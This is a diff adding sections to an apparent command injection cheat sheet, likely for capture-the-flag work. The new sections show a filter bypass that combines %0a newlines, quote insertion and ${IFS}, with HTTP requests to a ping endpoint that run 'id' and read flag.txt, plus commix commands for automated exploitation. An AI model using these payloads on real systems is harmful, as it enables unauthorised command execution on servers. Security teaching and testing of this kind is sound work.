@@ -429,6 +429,50 @@ Often not blacklisted - use `%0a`:
 
 ---
 
+## Newline + Quote Bypass (Double Filter)
+
+When both newline characters and spaces are filtered, combine `%0a` with single-quote insertion and `${IFS}` for spaces. The quote must come right after the `%0a` with no gap to bypass the filter:
+
+```http
+GET /ping.php?ip=127.0.0.1%0a'i'd HTTP/1.1
+Host: target.local
+```
+
+**Response confirms command injection:**
+
+```
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+```
+
+Final payload reading a file with `cat` obfuscated via quotes and `${IFS}` for spaces:
+
+```http
+GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}flag.txt HTTP/1.1
+Host: target.local
+```
+
+---
+
+## commix (Automated Command Injection)
+
+[commix](https://github.com/commixproject/commix) automates command injection discovery and exploitation. Use `*` as an injection marker in the request file, or let it auto-detect.
+
+### Basic Usage with Request File
+
+```bash
+python3 commix.py -r request.req
+```
+
+### With OS, Prefix, and Batch Mode
+
+When you know the OS and need a specific injection prefix (e.g. newline bypass):
+
+```bash
+python3 commix.py -r ping.req --os=Unix --prefix='%0a' --batch
+```
+
+---
+
 ## Example Challenge Payload
 
 ```http
